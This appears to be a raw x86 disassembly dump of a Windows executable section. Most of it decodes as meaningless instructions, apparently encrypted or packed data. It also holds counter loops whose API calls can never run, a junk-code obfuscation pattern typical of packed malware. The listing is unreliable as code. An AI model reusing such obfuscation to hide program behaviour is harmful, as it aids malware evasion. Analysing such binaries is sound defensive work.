  40ee99:	pop    edi
  40ee9a:	jecxz  0x40ee66
  40ee9c:	adc    eax,0xe8c6b857
  40eea1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eea2:	retf   
  40eea3:	icebp  
  40eea4:	xchg   DWORD PTR [ebx+ebx*4+0x7aef678f],ecx
  40eeab:	sub    ecx,DWORD PTR [esi]
  40eead:	out    0x33,eax
  40eeaf:	mov    dh,0xa4
  40eeb1:	int    0xa4
  40eeb3:	xchg   ecx,eax
  40eeb4:	mov    dl,0xc7
  40eeb6:	das    
  40eeb7:	pop    ecx
  40eeb8:	add    ebx,DWORD PTR [esi+0x6b]
  40eebb:	mov    ebx,0x6bc6590d
  40eec0:	mov    bl,BYTE PTR [ecx-0x3f1f72bf]
  40eec6:	jae    0x40ef18
  40eec8:	fwait
  40eec9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eeca:	test   DWORD PTR [esi-0x3960db1a],ecx
  40eed0:	push   edi
  40eed1:	out    0x9c,eax
  40eed3:	mov    ecx,0x45601918
  40eed8:	(bad)  
  40eed9:	push   ds
  40eeda:	stos   BYTE PTR es:[edi],al
  40eedb:	icebp  
  40eedc:	fist   WORD PTR [ebx+0x489860c3]
  40eee2:	rcl    BYTE PTR [ecx-0x24095bfe],0xc8
  40eee9:	push   edx
  40eeea:	rcr    DWORD PTR [esp+ebx*1],1
  40eeed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eeee:	mov    cl,0x61
  40eef0:	cmp    al,0xef
  40eef2:	pop    es
  40eef3:	mov    ebx,0x69fc7fae
  40eef8:	mov    ecx,eax
  40eefa:	push   eax
  40eefb:	lea    edx,[edx+ebx*2+0x54b1e4cd]
  40ef02:	xlat   BYTE PTR ds:[ebx]
  40ef03:	push   eax
  40ef04:	int3   
  40ef05:	out    dx,eax
  40ef06:	jg     0x40eef5
  40ef08:	out    dx,eax
  40ef09:	sbb    DWORD PTR [ebx+edi*8+0x2f],edi
  40ef0d:	add    edi,edi
  40ef0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ef10:	(bad)  [esi]
  40ef12:	sar    BYTE PTR [edx+ebp*2-0x23],0xca
  40ef17:	or     BYTE PTR [edx+0x3d8877e5],dl
  40ef1d:	mov    ds:0xf62dada5,al
  40ef22:	leave  
  40ef23:	push   ss
  40ef24:	jne    0x40ef99
  40ef26:	into   
  40ef27:	cmp    edi,DWORD PTR [edx+eiz*8+0x49defc6e]
  40ef2e:	push   esp
  40ef2f:	push   edx
  40ef30:	dec    edi
  40ef31:	sbb    eax,0xde6b0d36
  40ef36:	jge    0x40ef5d
  40ef38:	xor    edi,DWORD PTR [ebp-0xa5a5447]
  40ef3e:	ss pusha 
  40ef40:	mov    eax,ds:0xe694de80
  40ef45:	cwde   
  40ef46:	add    ebp,DWORD PTR [ecx+0x3]
  40ef49:	jl     0x40ef3f
  40ef4b:	fst    DWORD PTR [esi+0x31b2eb12]
  40ef51:	jne    0x40efa7
  40ef53:	rol    DWORD PTR [ebx+0x25],0x54
  40ef57:	loope  0x40eeef
  40ef59:	mov    dl,0xc3
  40ef5b:	jmp    0xc190d40b
  40ef60:	pop    eax
  40ef61:	add    bl,BYTE PTR [edi]
  40ef63:	adc    bl,BYTE PTR [ebx]
  40ef65:	cmc    
  40ef66:	mov    DWORD PTR [ebx],ebp
  40ef68:	mov    edx,0x17cb3e4a
  40ef6d:	les    ecx,FWORD PTR [ebx-0x4d]
  40ef70:	aas    
  40ef71:	pusha  
  40ef72:	push   0x11e46810
  40ef77:	outs   dx,BYTE PTR ds:[esi]
  40ef78:	xchg   edi,eax
  40ef79:	sub    DWORD PTR [ecx],eax
  40ef7b:	shl    esp,cl
  40ef7d:	(bad)  [edi-0x284881d8]
  40ef83:	call   0x56c:0xe7d431f0
  40ef8a:	dec    edx
  40ef8b:	or     al,0x74
  40ef8d:	cld    
  40ef8e:	lea    eax,[esi-0x47e79deb]
  40ef94:	mov    al,ds:0x9cf358a7
  40ef99:	xor    bl,al
  40ef9b:	mov    ah,BYTE PTR [esi+0x168e463d]
  40efa1:	call   0xd244a866
  40efa6:	in     al,0x90
  40efa8:	shl    DWORD PTR [esi-0x5f],cl
  40efab:	mov    edx,0x998e8db7
  40efb0:	lds    edi,FWORD PTR [esi]
  40efb2:	and    DWORD PTR [ebx-0x6f],esi
  40efb5:	adc    ch,BYTE PTR [edi+0x386f8570]
  40efbb:	mov    edx,DWORD PTR [edx]
  40efbd:	adc    eax,0x76a049f2
  40efc2:	(bad)  
  40efc3:	cld    
  40efc4:	pop    edi
  40efc5:	ret    
  40efc6:	xchg   esp,eax
  40efc7:	or     edx,DWORD PTR [ecx+0x340b1214]
  40efcd:	rol    DWORD PTR [edi-0x7d830325],cl
  40efd3:	push   esi
  40efd4:	push   ebp
  40efd5:	ins    BYTE PTR es:[edi],dx
  40efd6:	stos   BYTE PTR es:[edi],al
  40efd7:	fcomp  st(1)
  40efd9:	ds scas al,BYTE PTR es:[edi]
  40efdb:	inc    esi
  40efdc:	fs mov ecx,0xd8f89793
  40efe2:	in     eax,0xb4
  40efe4:	and    al,0xe7
  40efe6:	pop    ss
  40efe7:	fld    QWORD PTR [edi-0x38ae5f0f]
  40efed:	jmp    0x107a:0xe8b353f5
  40eff4:	test   DWORD PTR [edi+0x18],esp
  40eff7:	adc    BYTE PTR [eax+esi*8+0x72],ch
  40effb:	adc    DWORD PTR [ebx+0xe],edx
  40effe:	fnstenv ds:0x4d6bcb61
  40f004:	mov    ebx,0x7892703c
  40f009:	lds    eax,FWORD PTR [eax]
  40f00b:	xor    al,cl
  40f00d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f00e:	les    ebp,FWORD PTR [ecx+ebx*2]
  40f011:	ret    0x8990
  40f014:	adc    DWORD PTR [ecx+ecx*4+0x55],edx
  40f018:	clc    
  40f019:	and    DWORD PTR ds:0x42a801,0x0
  40f023:	xor    edi,edi
  40f025:	add    edi,DWORD PTR ds:0x42a801
  40f02b:	inc    edi
  40f02c:	mov    DWORD PTR ds:0x42a801,edi
  40f032:	cmp    DWORD PTR ds:0x42a801,0xa
  40f039:	jne    0x40f04a
  40f03f:	push   0x23fa
  40f044:	call   DWORD PTR ds:0x41d0d0
  40f04a:	cmp    DWORD PTR ds:0x42a801,0x9
  40f051:	jne    0x40f066
  40f057:	xor    edi,edi
  40f059:	or     edi,DWORD PTR ds:0x42a801
  40f05f:	inc    edi
  40f060:	mov    DWORD PTR ds:0x42a801,edi
  40f066:	cmp    DWORD PTR ds:0x42a801,0x10
  40f06d:	jb     0x40f023
  40f073:	and    edi,edi
  40f075:	mov    edx,DWORD PTR [ebp+0x8]
  40f078:	and    DWORD PTR ds:0x42a88d,0x0
  40f082:	mov    edi,DWORD PTR ds:0x42a88d
  40f088:	inc    edi
  40f089:	mov    DWORD PTR ds:0x42a88d,edi
  40f08f:	cmp    DWORD PTR ds:0x42a88d,0x29
  40f096:	jne    0x40f0ac
  40f09c:	push   0x42a805
  40f0a1:	push   0x4a20
  40f0a6:	call   DWORD PTR ds:0x41d0d4
  40f0ac:	cmp    DWORD PTR ds:0x42a88d,0x1f
  40f0b3:	jb     0x40f082
  40f0b9:	and    DWORD PTR ds:0x42a759,0x6b84
  40f0c3:	xor    edx,eax
  40f0c5:	jmp    0x40f34d
  40f0ca:	enter  0xcbc4,0xc2
  40f0ce:	fcmovnb st,st(1)
  40f0d0:	aad    0xda
  40f0d2:	push   cs
  40f0d3:	and    al,0x97
  40f0d5:	cmp    al,0xea
  40f0d7:	sub    eax,0xbcce88df
  40f0dc:	js     0x40f156
  40f0de:	in     eax,0x7e
  40f0e0:	js     0x40f15a
  40f0e2:	dec    ebx
  40f0e3:	add    al,0x45
  40f0e5:	out    dx,eax
  40f0e6:	jmp    0x612e4175
  40f0eb:	js     0x40f092
  40f0ed:	fnstenv ds:0x2625369b
  40f0f3:	ret    
  40f0f4:	ror    BYTE PTR [eax-0x61],cl
  40f0f7:	jecxz  0x40f176
  40f0f9:	jmp    0x77ca21c5
  40f0fe:	inc    ebx
  40f0ff:	icebp  
  40f100:	inc    ebx
  40f101:	mov    ds:0x149bf8db,al
  40f106:	mov    ebx,0x51e9cb07
  40f10b:	push   ebx
  40f10c:	(bad)  
  40f10d:	jo     0x40f175
  40f10f:	imul   esp,esp,0x5a8cf27d
  40f115:	pop    ds
  40f116:	ret    
  40f117:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f118:	bound  esi,QWORD PTR [ebx+0x5c]
  40f11b:	and    al,0x4c
  40f11d:	mov    edi,0xce3b6ee4
  40f122:	jle    0x40f0ff
  40f124:	rol    edx,cl
  40f126:	sbb    DWORD PTR [ebp-0xf06d111],ecx
  40f12c:	push   DWORD PTR [edi-0x7d]
  40f12f:	pop    ss
  40f130:	(bad)  
  40f131:	dec    eax
  40f132:	fsubr  QWORD PTR [ecx+ecx*2+0x1fc4617e]
  40f139:	test   DWORD PTR [ecx],ecx
  40f13b:	inc    edx
  40f13c:	or     al,0xff
  40f13e:	shr    DWORD PTR [edi-0x5e],cl
  40f141:	ins    DWORD PTR es:[edi],dx
  40f142:	clc    
  40f143:	inc    ebp
  40f144:	and    al,0xd5
  40f146:	ins    DWORD PTR es:[edi],dx
  40f147:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f148:	add    BYTE PTR [edi+0x47ec834e],ch
  40f14e:	jbe    0x40f188
  40f150:	out    dx,eax
  40f151:	outs   dx,BYTE PTR ds:[esi]
  40f152:	and    BYTE PTR [ebx],0x6e
  40f155:	mov    edx,0xe543166e
  40f15a:	pop    ebp
  40f15b:	mov    ds:0xd09bdb6d,al
  40f160:	pushf  
  40f161:	ror    ebx,cl
  40f163:	add    BYTE PTR [ebx+0x73c68c84],0xb2
  40f16a:	mov    edi,0x744fb1ba
  40f16f:	imul   ebx,DWORD PTR [ebx-0x19],0xd701a3d7
  40f176:	mul    edi
  40f178:	stc    
  40f179:	cmp    edi,DWORD PTR [edx-0x2d]
  40f17c:	jl     0x40f16d
  40f17e:	push   edi
  40f17f:	test   BYTE PTR [esi-0x71],0x9c
  40f183:	adc    cl,0x57
  40f186:	or     BYTE PTR [edi+0x20ac5c04],dh
  40f18c:	push   esi
  40f18d:	shl    DWORD PTR [edx+0x72],0xff
  40f191:	imul   edi,DWORD PTR [eax+0x4],0xffffffb5
  40f195:	push   0xe93d40a
  40f19a:	push   ebx
  40f19b:	push   esp
  40f19c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f19d:	fs enter 0x4fae,0xbc
  40f1a2:	xor    ch,BYTE PTR [edx+0x72935b4]
  40f1a8:	fldenv [edx+ebx*1]
  40f1ab:	jle    0x40f1b1
  40f1ad:	add    al,0xde
  40f1af:	outs   dx,DWORD PTR ds:[esi]
  40f1b0:	ret    
  40f1b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f1b2:	mov    edx,0x745d3068
  40f1b7:	jno    0x40f1b5
  40f1b9:	fcomp  st(3)
  40f1bb:	ds mov ebx,0x18f58798
  40f1c1:	push   ebx
  40f1c2:	fdivr  QWORD PTR [ecx]
  40f1c4:	mov    bl,0x35
  40f1c6:	arpl   bx,bx
  40f1c8:	fdivr  st(2),st
  40f1ca:	xchg   ecx,eax
  40f1cb:	jmp    0x40f169
  40f1cd:	out    dx,eax
  40f1ce:	fdiv   QWORD PTR [esi]
  40f1d0:	xor    dh,BYTE PTR fs:[ecx-0x5]
  40f1d4:	ret    0xd21f
  40f1d7:	leave  
  40f1d8:	je     0x40f1f1
  40f1da:	in     eax,0xb5
  40f1dc:	lods   eax,DWORD PTR ds:[esi]
  40f1dd:	push   eax
  40f1de:	popf   
  40f1df:	xlat   BYTE PTR ds:[ebx]
  40f1e0:	outs   dx,DWORD PTR ds:[si]
  40f1e2:	push   ss
  40f1e3:	adc    bh,cl
  40f1e5:	xchg   ebx,eax
  40f1e6:	(bad)  
  40f1e7:	jle    0x40f1e1
  40f1e9:	jge    0x40f218
  40f1eb:	and    bl,BYTE PTR [esp+edx*1+0x1288affe]
  40f1f2:	outs   dx,DWORD PTR ds:[esi]
  40f1f3:	jo     0x40f1f7
  40f1f5:	jo     0x40f1d7
  40f1f7:	shl    DWORD PTR [esi-0x6e4fd504],0x4b
  40f1fe:	out    0x22,eax
  40f200:	ror    BYTE PTR [ecx+0x12],cl
  40f203:	aam    0x84
  40f205:	mov    cl,0x55
  40f207:	les    eax,FWORD PTR [esp+eiz*4-0x54]
  40f20b:	xor    bl,BYTE PTR [ebp+0x69]
  40f20e:	cmp    BYTE PTR [ebp*8-0x81fbaff],cl
  40f215:	or     esp,DWORD PTR [ebx-0x76241354]
  40f21b:	sub    esi,DWORD PTR es:[esi-0x4d0305d9]
  40f222:	sbb    esi,DWORD PTR [edi]
  40f224:	push   ds
  40f225:	cpuid  
  40f227:	cmp    esi,DWORD PTR [ebx+0x2f8a7054]
  40f22d:	ins    DWORD PTR es:[edi],dx
  40f22e:	fisttp DWORD PTR [edx]
  40f230:	sbb    BYTE PTR [ecx],ch
  40f232:	out    dx,eax
  40f233:	sbb    BYTE PTR [edx-0x58086094],ch
  40f239:	sbb    BYTE PTR [ebp-0x1d],al
  40f23c:	jmp    0x4e7d:0x2433bdf0
  40f243:	xchg   ebp,eax
  40f244:	dec    ebx
  40f245:	sub    al,BYTE PTR [eax+0x579dc37e]
  40f24b:	imul   ecx,DWORD PTR [ebp-0x21],0xb70fad42
  40f252:	(bad)  
  40f253:	stc    
  40f254:	mov    bh,0x31
  40f256:	xchg   esi,eax
  40f257:	aam    0xed
  40f259:	btc    esp,esi
  40f25c:	ficom  WORD PTR [ebp-0x398a6d8f]
  40f262:	jmp    0x40f2d3
  40f264:	cli    
  40f265:	sub    dh,0x88
  40f268:	mov    ?,WORD PTR [ebp-0x4fe9ada0]
  40f26e:	lea    eax,[edi-0x403ba838]
  40f274:	stos   BYTE PTR es:[edi],al
  40f275:	lahf   
  40f276:	in     al,0x5f
  40f278:	jmp    0x40f23f
  40f27a:	cld    
  40f27b:	push   ebp
  40f27c:	push   ebp
  40f27d:	jbe    0x40f2dc
  40f27f:	dec    eax
  40f280:	xor    bl,BYTE PTR [ecx-0x1b200217]
  40f286:	data16 ftst 
  40f289:	jg     0x40f2bf
  40f28b:	cmp    eax,DWORD PTR [eax]
  40f28d:	inc    eax
  40f28e:	jl     0x40f298
  40f290:	cmp    DWORD PTR [esi+edx*2+0x10996c6f],ecx
  40f297:	or     esi,esi
  40f299:	jmp    0x4b6a33
  40f29e:	and    DWORD PTR [edi],ebp
  40f2a0:	jmp    0xa5e204e9
  40f2a5:	daa    
  40f2a6:	test   DWORD PTR [esi],ecx
  40f2a8:	mov    edi,0x56dd43e7
  40f2ad:	in     al,dx
  40f2ae:	and    esi,DWORD PTR [eax+0x52f9f8e5]
  40f2b4:	xchg   esi,eax
  40f2b5:	mov    cl,0x94
  40f2b7:	rcl    dh,cl
  40f2b9:	call   DWORD PTR [edi+0x70]
  40f2bc:	pop    edx
  40f2bd:	mul    DWORD PTR [ecx]
  40f2bf:	imul   ebp,esp,0xd5f3c060
  40f2c5:	adc    esp,DWORD PTR [edi+0x5f]
  40f2c8:	out    0xf5,al
  40f2ca:	sub    BYTE PTR [ebx],0xda
  40f2cd:	loopne 0x40f2db
  40f2cf:	or     DWORD PTR [edi],edx
  40f2d1:	xor    BYTE PTR [ecx+0x6a],0xff
  40f2d5:	cmp    DWORD PTR [edx+0x39],0xaecce0a6
  40f2dc:	and    BYTE PTR [ebp-0x3dd23674],dh
  40f2e2:	jmp    0xe4c7:0xe72ae71
  40f2e9:	add    ch,BYTE PTR [eax+0x3dacbd1]
  40f2ef:	inc    ebx
  40f2f0:	ret    
  40f2f1:	mov    fs,WORD PTR [esi+0x6c]
  40f2f4:	fdiv   st,st(5)
  40f2f6:	cwde   
  40f2f7:	jbe    0x40f2c7
  40f2f9:	xchg   esi,eax
  40f2fa:	popa   
  40f2fb:	rcl    BYTE PTR [eax],cl
  40f2fd:	loopne 0x40f2f4
  40f2ff:	test   BYTE PTR [esi],0xf6
  40f302:	dec    esi
  40f303:	(bad)  
  40f304:	mov    ch,0xc2
  40f306:	sbb    al,0xf9
  40f308:	pop    ebx
  40f309:	or     BYTE PTR [eax-0x49222ad],0x9c
  40f310:	inc    esp
  40f311:	or     al,0x33
  40f313:	xchg   edi,eax
  40f314:	out    dx,eax
  40f315:	fwait
  40f316:	bound  ebx,QWORD PTR [eax-0x15]
  40f319:	cmpps  xmm5,XMMWORD PTR [edx+0x3d52d71f],0xd7
  40f321:	in     al,dx
  40f322:	push   eax
  40f323:	aaa    
  40f324:	je     0x40f2ce
  40f326:	mov    al,BYTE PTR [ecx-0x7e]
  40f329:	ds in  eax,dx
  40f32b:	push   esp
  40f32c:	mov    ch,0x8f
  40f32e:	fldcw  WORD PTR [ecx]
  40f330:	sbb    ah,BYTE PTR [ebp+0x52dbe38c]
  40f336:	(bad)  
  40f337:	add    BYTE PTR [edi+0x72132e31],bl
  40f33d:	in     eax,dx
  40f33e:	add    BYTE PTR [edi+esi*2-0x3d],ch
  40f342:	in     al,0x47
  40f344:	or     al,0xe5
  40f346:	mov    eax,0xefa7bbd8
  40f34b:	jmp    0xc811f66c
  40f350:	add    eax,0x42a80d
  40f355:	sbb    eax,0x83000000
  40f35a:	cmp    eax,0x42a80d
  40f35f:	add    BYTE PTR [edi],cl
  40f361:	test   BYTE PTR [ebp+0x0],bl
  40f364:	add    BYTE PTR [eax],al
  40f366:	cmp    DWORD PTR ds:0x42a80d,0x7
  40f36d:	jne    0x40f389
  40f373:	push   DWORD PTR [ebp-0x20]
  40f376:	push   DWORD PTR [ebp-0x14]
  40f379:	push   0x7b1d
  40f37e:	push   0x2bb5
  40f383:	call   DWORD PTR ds:0x41d258
  40f389:	cmp    DWORD PTR ds:0x42a80d,0x8
  40f390:	jne    0x40f3a3
  40f396:	mov    edi,DWORD PTR ds:0x42a80d
  40f39c:	dec    edi
  40f39d:	mov    DWORD PTR ds:0x42a80d,edi
  40f3a3:	mov    edi,DWORD PTR ds:0x42a80d
  40f3a9:	dec    edi
  40f3aa:	mov    DWORD PTR ds:0x42a80d,edi
  40f3b0:	jmp    0x40f359
  40f3b5:	xor    edi,edi
  40f3b7:	add    edi,DWORD PTR ds:0x42a759
  40f3bd:	add    DWORD PTR ds:0x42a775,edi
  40f3c3:	mov    DWORD PTR [ebp+0xc],edx
  40f3c6:	xor    edx,DWORD PTR ds:0x42a769
  40f3cc:	mov    DWORD PTR [ebp-0x4],0xf89c85d8
  40f3d3:	or     edx,edx
  40f3d5:	mov    DWORD PTR [ebp-0x28],0xf89c853a
  40f3dc:	and    DWORD PTR ds:0x42a841,0x0
  40f3e6:	jmp    0x40f3f8
  40f3eb:	mov    edx,DWORD PTR ds:0x42a841
  40f3f1:	inc    edx
  40f3f2:	mov    DWORD PTR ds:0x42a841,edx
  40f3f8:	cmp    DWORD PTR ds:0x42a841,0x12
  40f3ff:	jae    0x40f427
  40f405:	cmp    DWORD PTR ds:0x42a841,0x14
  40f40c:	jne    0x40f420
  40f412:	push   0x4578
  40f417:	push   DWORD PTR [ebp-0x14]
  40f41a:	call   DWORD PTR ds:0x41d25c
  40f420:	jmp    0x40f3eb
  40f425:	and    edi,edi
  40f427:	mov    DWORD PTR [ebp-0x2c],0xf89c853b
  40f42e:	sub    edi,DWORD PTR ds:0x42a879
  40f434:	mov    DWORD PTR [ebp-0x30],0xf89c853c
  40f43b:	and    edi,0x6695
  40f441:	mov    DWORD PTR [ebp-0x34],0xf89c853d
  40f448:	or     DWORD PTR ds:0x42a775,0x61f4
  40f452:	mov    DWORD PTR [ebp-0x38],0xf89c853e
  40f459:	and    DWORD PTR ds:0x42a809,0x0
  40f463:	jmp    0x40f477
  40f468:	xor    edx,edx
  40f46a:	xor    edx,DWORD PTR ds:0x42a809
  40f470:	inc    edx
  40f471:	mov    DWORD PTR ds:0x42a809,edx
  40f477:	cmp    DWORD PTR ds:0x42a809,0x11
  40f47e:	jae    0x40f4ac
  40f484:	cmp    DWORD PTR ds:0x42a809,0x1a
  40f48b:	jne    0x40f4a7
  40f491:	push   0x1
  40f493:	push   DWORD PTR [ebp-0xc]
  40f496:	push   DWORD PTR [ebp-0x20]
  40f499:	push   0x1352
  40f49e:	push   DWORD PTR [ebp-0x18]
  40f4a1:	call   DWORD PTR ds:0x41d0d8
  40f4a7:	jmp    0x40f468
  40f4ac:	mov    DWORD PTR [ebp-0x3c],0xf89c853f
  40f4b3:	mov    edx,DWORD PTR [ebp+0x8]
  40f4b6:	xor    edx,eax
  40f4b8:	mov    DWORD PTR ds:0x42a7c9,0x16
  40f4c2:	cmp    DWORD PTR ds:0x42a7c9,0x0
  40f4c9:	je     0x40f553
  40f4cf:	cmp    DWORD PTR ds:0x42a7c9,0x21
  40f4d6:	jne    0x40f4f6
  40f4dc:	push   0x6e96
  40f4e1:	push   0x4a9d
  40f4e6:	push   0x2037
  40f4eb:	push   0x3f81
  40f4f0:	call   DWORD PTR ds:0x41d0dc
  40f4f6:	xor    edi,edi
  40f4f8:	or     edi,DWORD PTR ds:0x42a7c9
  40f4fe:	dec    edi
  40f4ff:	mov    DWORD PTR ds:0x42a7c9,edi
  40f505:	jmp    0x40f4c2
  40f50a:	and    DWORD PTR ds:0x42a841,0x0
  40f514:	jmp    0x40f528
  40f519:	xor    edi,edi
  40f51b:	or     edi,DWORD PTR ds:0x42a841
  40f521:	inc    edi
  40f522:	mov    DWORD PTR ds:0x42a841,edi
  40f528:	cmp    DWORD PTR ds:0x42a841,0x1e
  40f52f:	jae    0x40f553
  40f535:	cmp    DWORD PTR ds:0x42a841,0x26
  40f53c:	jne    0x40f548
  40f542:	call   DWORD PTR ds:0x41d0e0
  40f548:	jmp    0x40f519
  40f54d:	dec    DWORD PTR ds:0x42a7cd
  40f553:	mov    edi,DWORD PTR [ebp-0x10]
  40f556:	mov    DWORD PTR ds:0x42a831,0x29a7
  40f560:	jmp    0x40f7e8
  40f565:	(bad)
  40f568:	ret    0xc2d9
  40f56b:	(bad)  
  40f56d:	sar    DWORD PTR [edi],0x6b
  40f570:	shl    DWORD PTR [ebx-0x4449e93a],0x42
  40f577:	js     0x40f5f1
  40f579:	in     eax,0x7e
  40f57b:	js     0x40f5f5
  40f57d:	imul   esp,DWORD PTR [eax+esi*4-0x1d],0xffffffa9
  40f582:	sbb    dh,dl
  40f584:	inc    ebp
  40f585:	mov    bh,0xee
  40f587:	or     dl,ch
  40f589:	sub    eax,0x59ad15af
  40f58e:	hlt    
  40f58f:	or     DWORD PTR [ebx-0x71930faf],ebx
  40f595:	fprem1 
  40f597:	pop    ebx
  40f598:	mov    ah,0xea
  40f59a:	int    0x3a
  40f59c:	jo     0x40f597
  40f59e:	jg     0x40f5f4
  40f5a0:	mov    ah,0x45
  40f5a2:	outs   dx,DWORD PTR ds:[esi]
  40f5a3:	push   cs
  40f5a4:	cmp    DWORD PTR [ebx-0x70f4db64],eax
  40f5aa:	je     0x40f60c
  40f5ac:	sahf   
  40f5ad:	xchg   edi,eax
  40f5ae:	push   esp
  40f5af:	jo     0x40f62f
  40f5b1:	retf   
  40f5b2:	sahf   
  40f5b3:	adc    al,0x16
  40f5b5:	jo     0x40f5bf
  40f5b7:	(bad)  
  40f5b9:	loope  0x40f586
  40f5bb:	sar    ecx,1
  40f5bd:	popf   
  40f5be:	or     ebp,esp
  40f5c0:	pop    ebx
  40f5c1:	jecxz  0x40f619
  40f5c3:	xchg   ebx,eax
  40f5c4:	mov    al,0x66
  40f5c6:	out    dx,eax
  40f5c7:	(bad)  
  40f5c8:	dec    esp
  40f5c9:	mov    esi,0x3a152c79
  40f5ce:	dec    edi
  40f5cf:	dec    esp
  40f5d0:	push   ecx
  40f5d1:	adc    eax,DWORD PTR [edi+ebx*8+0x17]
  40f5d5:	pushf  
  40f5d6:	sbb    esp,0xc1b2a5a8
  40f5dc:	mov    al,0x7d
  40f5de:	sub    dh,BYTE PTR [edx+0x1428c298]
  40f5e4:	cmp    BYTE PTR [ecx-0x26951785],cl
  40f5ea:	ss out 0x5f,al
  40f5ed:	cmp    ebx,DWORD PTR [eax-0x60e1b08f]
  40f5f3:	add    bh,BYTE PTR [eax+edi*8]
  40f5f6:	gs repz inc ecx
  40f5f9:	test   eax,0xeeda0246
  40f5fe:	inc    edx
  40f5ff:	mov    ch,0x54
  40f601:	adc    DWORD PTR [ebx],ecx
  40f603:	adc    al,0x4e
  40f605:	sbb    eax,DWORD PTR [esi]
  40f607:	or     ch,BYTE PTR cs:0xa3453efd
  40f60e:	jp     0x40f603
  40f610:	cdq    
  40f611:	mov    ds:0xcfbf46a7,eax
  40f616:	stos   BYTE PTR es:[edi],al
  40f617:	lods   al,BYTE PTR ds:[esi]
  40f618:	jo     0x40f659
  40f61a:	iret   
  40f61b:	(bad)  
  40f61c:	pop    edi
  40f61d:	jle    0x40f67b
  40f61f:	fistp  QWORD PTR [edi-0x63]
  40f622:	imul   esi,DWORD PTR [ecx],0xfffffff6
  40f625:	out    0x6e,eax
  40f627:	ret    
  40f628:	jb     0x40f68e
  40f62a:	arpl   WORD PTR [eax+0x1519c125],bp
  40f630:	in     al,0xe9
  40f632:	xchg   esi,eax
  40f633:	dec    al
  40f635:	push   ebx
  40f636:	aam    0x72
  40f638:	scas   al,BYTE PTR es:[edi]
  40f639:	jg     0x40f69d
  40f63b:	mov    eax,0x58366de7
  40f640:	push   cs
  40f641:	dec    edi
  40f642:	mov    bl,0xa
  40f644:	ja     0x40f608
  40f646:	jo     0x40f5d3
  40f648:	test   DWORD PTR [ebx-0x563a43c5],0xf1e2a44f
  40f652:	mov    ds:0xac9e7380,eax
  40f657:	mov    ecx,0xda2adc5a
  40f65c:	and    ch,bh
  40f65e:	or     DWORD PTR [ecx+0x33],0xc
  40f662:	call   0x6cdd:0xddaa491f
  40f669:	in     eax,0xd2
  40f66b:	popa   
  40f66c:	or     eax,0x3bcb8f3b
  40f671:	sahf   
  40f672:	jb     0x40f6c1
  40f674:	push   edi
  40f675:	and    DWORD PTR [ecx],esp
  40f677:	out    dx,al
  40f678:	scas   eax,DWORD PTR es:[edi]
  40f679:	sbb    ebx,DWORD PTR [edi-0x64369e1f]
  40f67f:	test   DWORD PTR [ecx-0x46],esi
  40f682:	jno    0x40f6a9
  40f684:	ds jmp 0x40f6c5
  40f687:	and    BYTE PTR [edx],0xe0
  40f68a:	xor    esp,DWORD PTR [edi+0x66]
  40f68d:	xor    BYTE PTR [eax+edi*4-0x623112f7],ah
  40f694:	mov    cl,0x7f
  40f696:	push   eax
  40f697:	dec    eax
  40f698:	sub    cl,BYTE PTR [ecx+0x3be5e80a]
  40f69e:	in     al,0xe0
  40f6a0:	aad    0x92
  40f6a2:	pop    eax
  40f6a3:	leave  
  40f6a4:	fst    QWORD PTR [ebx-0x378008da]
  40f6aa:	xor    al,0x5e
  40f6ac:	neg    DWORD PTR [esi]
  40f6ae:	scas   al,BYTE PTR es:[edi]
  40f6af:	xchg   DWORD PTR [esi-0x80],edi
  40f6b2:	call   0x50754393
  40f6b7:	gs pop ecx
  40f6b9:	cmp    dl,BYTE PTR [edi]
  40f6bb:	lea    edx,[ecx-0x2c]
  40f6be:	inc    ecx
  40f6bf:	(bad)  
  40f6c0:	mov    bl,0x35
  40f6c2:	fcom   DWORD PTR [ebx]
  40f6c4:	sub    esi,ebp
  40f6c6:	lahf   
  40f6c7:	test   DWORD PTR [ecx-0x42afaf9b],ebp
  40f6cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f6ce:	test   BYTE PTR [edx+0x6d7503a4],cl
  40f6d4:	pop    esp
  40f6d5:	jns    0x40f674
  40f6d7:	dec    DWORD PTR [edx+ebp*1-0x34]
  40f6db:	push   ds
  40f6dc:	outs   dx,BYTE PTR ds:[esi]
  40f6dd:	fs pop ss
  40f6df:	mov    ch,0x90
  40f6e1:	dec    edx
  40f6e2:	cli    
  40f6e3:	(bad)  
  40f6e5:	push   esp
  40f6e6:	cmp    al,0x97
  40f6e8:	pop    es
  40f6e9:	das    
  40f6ea:	cmp    eax,0x933b49ca
  40f6ef:	dec    ebx
  40f6f0:	gs push ebx
  40f6f2:	mov    esi,edx
  40f6f4:	push   ss
  40f6f5:	adc    BYTE PTR [edx],bl
  40f6f7:	sub    al,0xee
  40f6f9:	or     DWORD PTR [ebx+eax*8-0x4a],edx
  40f6fd:	(bad)  
  40f6ff:	iret   
  40f700:	rol    ah,cl
  40f702:	xor    ebx,DWORD PTR [ebx]
  40f704:	ds in  al,dx
  40f706:	stc    
  40f707:	repnz mov DWORD PTR [edx-0x47852bbc],edi
  40f70e:	mov    ebp,DWORD PTR [ecx-0x13]
  40f711:	pop    ebx
  40f712:	add    DWORD PTR [esi],esi
  40f714:	(bad)
  40f717:	or     al,0x3b
  40f719:	add    al,0x57
  40f71b:	cwde   
  40f71c:	sar    DWORD PTR [edi],1
  40f71e:	xor    edi,DWORD PTR [edi+0x3d]
  40f721:	fstp   QWORD PTR [esi+0x15]
  40f724:	cmp    ebx,DWORD PTR [edi]
  40f726:	pop    ds
  40f727:	xchg   ecx,eax
  40f728:	lods   eax,DWORD PTR ds:[esi]
  40f729:	out    dx,eax
  40f72a:	mov    cl,0x97
  40f72c:	aam    0x6c
  40f72e:	(bad)  
  40f72f:	retf   0x5085
  40f732:	xchg   edx,eax
  40f733:	inc    esi
  40f734:	call   0x4eca3183
  40f739:	scas   al,BYTE PTR es:[edi]
  40f73a:	mov    cl,0xdc
  40f73c:	(bad)  
  40f73d:	sub    al,BYTE PTR [edx+0x4]
